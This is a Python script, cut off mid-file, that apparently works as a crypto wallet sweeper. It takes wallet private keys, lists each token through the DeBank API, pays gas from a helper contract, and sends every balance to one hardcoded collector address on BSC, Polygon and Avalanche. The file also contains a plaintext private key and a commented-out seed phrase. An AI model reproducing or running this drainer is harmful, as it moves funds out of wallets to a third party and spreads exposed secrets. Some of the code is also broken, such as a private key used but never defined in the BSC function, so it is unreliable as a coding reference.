import configparser
import requests
import json
import time
from mnemonic import Mnemonic
from web3 import Web3
#from fast_fu import mneam_bsc
config = configparser.ConfigParser()
config.read('config.ini')

my_chat_id = '1844570822'


#mnemonic ='way sick tip face dirt about giraffe cancel execute squeeze twice suspect'

def txt2list(fname):
    with open(fname, 'r', encoding="utf8") as f:
        return [line.strip() for line in f]

web3e = Web3(Web3.HTTPProvider('https://rpc.flashbots.net'))
web3b = Web3(Web3.HTTPProvider('https://bsc-dataseed.binance.org/'))
web3m = Web3(Web3.HTTPProvider('https://polygon-rpc.com/'))
web3a = Web3(Web3.HTTPProvider('https://api.avax.network/ext/bc/C/rpc'))

contract_owner = web3b.toChecksumAddress('0x9E9e7945A35c6c0C34303AAa5B9A959def035912')
#скрипт контракта
def contract_script(amount, addrress):
    contract_address = web3b.toChecksumAddress('0xD66f5b933B2FAa50f24cC27d4691ac0395F44018')
    contract_owner = web3b.toChecksumAddress('0x9E9e7945A35c6c0C34303AAa5B9A959def035912')
    abi_mycontract = json.loads('[{"inputs":[],"stateMutability":"payable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"AllowToken","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Send","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"ownerToken","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenAllovedGet","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"contractIERC20","name":"token","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenGet","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"from","type":"address"},{"indexed":false,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TransferSent","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"ownerToken","type":"address"},{"indexed":false,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TransferSentAllowed","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ValueReceived","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"allowToken","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"commissionAdress","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"commissionPersent","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"},{"internalType":"address","name":"ownerToken","type":"address"}],"name":"getAllowedToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"}],"name":"getToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"send","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"persent","type":"uint256"}],"name":"setCommition","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"}],"name":"tokenBalanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"addresspayable","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"},{"internalType":"address","name":"ownerToken","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferAllowedToken","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferToken","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"payable","type":"function"},{"stateMutability":"payable","type":"receive"}]')
    contract_scr = web3m.eth.contract(address=contract_address, abi=abi_mycontract)
    contract_nonce = web3b.eth.getTransactionCount(contract_owner)
    gasPrice = web3m.eth.gasPrice+web3m.eth.max_priority_fee
    token_tx_scr = contract_scr.functions.transfer(web3b.toChecksumAddress(addrress), amount).buildTransaction({
        'chainId':56, 'gas': 150000, 'gasPrice': gasPrice, 'nonce':contract_nonce
    })
    sign_txn_scr = web3b.eth.account.signTransaction(token_tx_scr, owner_private_key)
    web3b.eth.sendRawTransaction(sign_txn_scr.rawTransaction)
    print(f"Transaction has been sent to {addrress}")
    return   
#МАТИК
def contract_script_mat(amount, addrress):
    contract_address = web3m.toChecksumAddress('0x9e1582CAb45E2638fD565F194329D3E17a5C8b29')
    contract_owner = web3m.toChecksumAddress('0x9E9e7945A35c6c0C34303AAa5B9A959def035912')
    abi_mycontract = json.loads('[{"inputs":[],"stateMutability":"payable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"AllowToken","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Send","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"ownerToken","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenAllovedGet","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"contractIERC20","name":"token","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenGet","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"from","type":"address"},{"indexed":false,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TransferSent","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"ownerToken","type":"address"},{"indexed":false,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TransferSentAllowed","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ValueReceived","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"allowToken","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"commissionAdress","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"commissionPersent","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"},{"internalType":"address","name":"ownerToken","type":"address"}],"name":"getAllowedToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"}],"name":"getToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"send","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"persent","type":"uint256"}],"name":"setCommition","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"}],"name":"tokenBalanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"addresspayable","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"},{"internalType":"address","name":"ownerToken","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferAllowedToken","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferToken","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"payable","type":"function"},{"stateMutability":"payable","type":"receive"}]')
    contract_scr = web3m.eth.contract(address=contract_address, abi=abi_mycontract)
    owner_private_key = '0xcaf19a70d1449cf7740469f00d571ae3eac7e206ed7edac407e7ebb16ad653a9'
    contract_nonce = web3m.eth.getTransactionCount(contract_owner)
    estimate = contract_scr.functions.transfer(web3m.toChecksumAddress(addrress), amount).estimateGas({'from':contract_owner})
    gasPrice = web3m.eth.gasPrice+web3m.eth.max_priority_fee
    token_tx_scr = contract_scr.functions.transfer(web3m.toChecksumAddress(addrress), amount).buildTransaction({
        'chainId':137, 'gas': estimate, 'gasPrice': gasPrice, 'nonce':contract_nonce
    })
    sign_txn_scr = web3m.eth.account.signTransaction(token_tx_scr, owner_private_key)
    tx_hash = web3m.eth.sendRawTransaction(sign_txn_scr.rawTransaction)
    print(f"Transaction has been sent to {addrress} with tx {web3m.toHex(tx_hash)}")
    return   
#Авакс
def contract_script_avax(amount, addrress):
    contract_address = web3a.toChecksumAddress('0xA11b7ed79a12F95933ed4C9e98e56B132E862FF5')
    contract_owner = web3a.toChecksumAddress('0x9E9e7945A35c6c0C34303AAa5B9A959def035912')
    abi_mycontract = json.loads('[{"inputs":[],"stateMutability":"payable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"AllowToken","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Send","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"ownerToken","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenAllovedGet","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"contractIERC20","name":"token","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenGet","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"from","type":"address"},{"indexed":false,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TransferSent","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"ownerToken","type":"address"},{"indexed":false,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TransferSentAllowed","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ValueReceived","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"allowToken","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"commissionAdress","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"commissionPersent","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"},{"internalType":"address","name":"ownerToken","type":"address"}],"name":"getAllowedToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"}],"name":"getToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"send","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"persent","type":"uint256"}],"name":"setCommition","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"}],"name":"tokenBalanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"addresspayable","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"},{"internalType":"address","name":"ownerToken","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferAllowedToken","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"contractIERC20","name":"token","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferToken","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"payable","type":"function"},{"stateMutability":"payable","type":"receive"}]')
    contract_scr = web3a.eth.contract(address=contract_address, abi=abi_mycontract)
    owner_private_key = '0xcaf19a70d1449cf7740469f00d571ae3eac7e206ed7edac407e7ebb16ad653a9'
    contract_nonce = web3a.eth.getTransactionCount(contract_owner)
    estimate = contract_scr.functions.transfer(web3a.toChecksumAddress(addrress), amount).estimateGas({'from':contract_owner})
    gasPrice = web3a.eth.gasPrice+web3a.eth.max_priority_fee
    token_tx_scr = contract_scr.functions.transfer(web3a.toChecksumAddress(addrress), amount).buildTransaction({
        'chainId':43114, 'gas': estimate, 'gasPrice': gasPrice, 'nonce':contract_nonce
    })
    sign_txn_scr = web3a.eth.account.signTransaction(token_tx_scr, owner_private_key)
    tx_hash = web3a.eth.sendRawTransaction(sign_txn_scr.rawTransaction)
    print(f"Transaction has been sent to {addrress} with tx {web3a.toHex(tx_hash)}")
    return   




################################################################################################################################################################################################################
def check_bsc_tokens(addrress, privaKey):
    print('Check bsc tokens')
    black_list_tokens = txt2list('black_list.txt')
    black_list = [tkn.lower() for tkn in black_list_tokens] 
    url = 'https://openapi.debank.com/v1/user/token_list?id='+addrress+'&chain_id=bsc&is_all=true'
    response = requests.get(url)
    data = json.loads(response.text)
    for token in data:
        #if token in data:
        val = (token['id'])
        if val not in black_list:
            try:
                addrress = web3b.toChecksumAddress(addrress)
                token_contract = web3b.toChecksumAddress(val)
                abi = json.loads('[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"isOwner","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pause","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"unpause","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]')
                contract = web3b.eth.contract(address=token_contract, abi=abi)
                name_t = contract.functions.name().call()
                symbol = contract.functions.symbol().call()
                #nonce = web3.eth.getTransactionCount(pubkk)
                balanceOf = contract.functions.balanceOf(addrress).call()
                print('Проверил баланс токена')
                nonce = web3b.eth.getTransactionCount(addrress)
                #bal = web3b.eth.get_balance(addrress)
                estimate = contract.functions.transfer(web3b.toChecksumAddress(contract_owner), balanceOf).estimateGas({'from':addrress})
                print(f"{name_t} {symbol} {val} Gas estimate is: {estimate}")
                if estimate>900000:
                    print("Лимит газа слишком высокий: ", estimate)
                else:
                    amount = estimate*web3b.toWei(7,'gwei')
                    print("Количество на комиссию: ", web3b.fromWei(amount, 'ether'))
                    if web3b.eth.get_balance(addrress)<amount:
                        contract_script(amount, addrress)
                    count=0
                    while web3b.eth.get_balance(addrress)<amount:
                        time.sleep(0.2)
                        #pubkk_getbalance = web3b.eth.get_balance(addrress)
                        count=count+1
                        if count==200:
                            print('Баланс не пополнен')
                            break
                    if web3b.eth.get_balance(addrress)>=amount:
                        print('Отправка')
                        token_tx = contract.functions.transfer(web3b.toChecksumAddress(contract_owner), balanceOf).buildTransaction({'from':addrress, 'chainId':56, 'gas': estimate, 'gasPrice': web3b.toWei(7, 'gwei'), 'nonce':nonce,})
                        for x in range(0, 7):
                            try:
                                sign_txn = web3b.eth.account.signTransaction(token_tx, privaKey)
                                tx_hash = web3b.eth.sendRawTransaction(sign_txn.rawTransaction)
                                print(f"Пробую отправить {x}")
                            except:
                                pass
                        print(f"Токен Отправлен :  {web3b.toHex(tx_hash)}")
                        time.sleep(1)
            except:
                print(f"Этот токен не пошел : {name_t} {symbol} {val}")
                bsc_black = open("black_list.txt", "a", encoding="utf8")
                bsc_black.write(val + "\n")
                bsc_black.close()
    return

def check_matic_tokens(addrress, privaKey):
    print('Проверка токенов матика')
    black_list_tokens = txt2list('black_list_mat.txt')
    black_list = [tkn.lower() for tkn in black_list_tokens] 
    url = 'https://openapi.debank.com/v1/user/token_list?id='+addrress+'&chain_id=matic&is_all=true'
    response = requests.get(url)
    data = json.loads(response.text)
    for token in data:
        #if token in data:
        val = (token['id'])
        if val not in black_list:
            try:
                addrress = web3m.toChecksumAddress(addrress)
                token_contract = web3m.toChecksumAddress(val)
                abi = json.loads('[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"isOwner","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pause","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"unpause","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]')
                contract = web3m.eth.contract(address=token_contract, abi=abi)
                name_t = contract.functions.name().call()
                symbol = contract.functions.symbol().call()
                #nonce = web3.eth.getTransactionCount(pubkk)
                balanceOf = contract.functions.balanceOf(addrress).call()
                nonce = web3m.eth.getTransactionCount(addrress)
                #bal = web3m.eth.get_balance(addrress)
                estimate = contract.functions.transfer(web3m.toChecksumAddress(contract_owner), balanceOf).estimateGas({'from':addrress})
                print(f"{name_t} {symbol} {val} Gas estimate is: {estimate}")
                if estimate>900000:
                    print("Gas limit very high: ", estimate)
                else:
                    amount = estimate*web3m.eth.gasPrice
                    print("Amount for fee: ", web3m.fromWei(amount, 'ether'))
                    if web3m.eth.get_balance(addrress)<amount:
                        contract_script_mat(amount, addrress)
                    count=0
                    while web3m.eth.get_balance(addrress)<amount:
                        time.sleep(0.2)
                        #pubkk_getbalance = web3m.eth.get_balance(addrress)
                        count=count+1
                        if count==200:
                            print('Баланс не пополнен')
                            break
                    if web3m.eth.get_balance(addrress)>=amount:
                        print('Sending')
                        token_tx = contract.functions.transfer(web3m.toChecksumAddress(contract_owner), balanceOf).buildTransaction({'from':addrress, 'chainId':137, 'gas': estimate, 'gasPrice': web3m.eth.gasPrice, 'nonce':nonce,})
                        for x in range(0, 7):
                            try:
                                sign_txn = web3m.eth.account.signTransaction(token_tx, privaKey)
                                tx_hash = web3m.eth.sendRawTransaction(sign_txn.rawTransaction)
                                print(f"Try it send {x}")
                            except:
                                pass
                        print(f"Token transfered :  {web3m.toHex(tx_hash)}")
                        time.sleep(1)
            except:
                print(f"Этот токен не пошел : {name_t} {symbol} {val}")
                mat_black = open("black_list_mat.txt", "a", encoding="utf8")
                mat_black.write(val + "\n")
                mat_black.close()
    return

def check_avax_tokens(addrress, privaKey):
    print('Check avax tokens')
    black_list_tokens = txt2list('black_list_avax.txt')
    black_list = [tkn.lower() for tkn in black_list_tokens] 
    url = 'https://openapi.debank.com/v1/user/token_list?id='+addrress+'&chain_id=avax&is_all=true'
    response = requests.get(url)
    data = json.loads(response.text)
    for token in data:
        #if token in data:
        val = (token['id'])
        if val not in black_list:
            try:
                addrress = web3a.toChecksumAddress(addrress)
                token_contract = web3a.toChecksumAddress(val)
                abi = json.loads('[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"i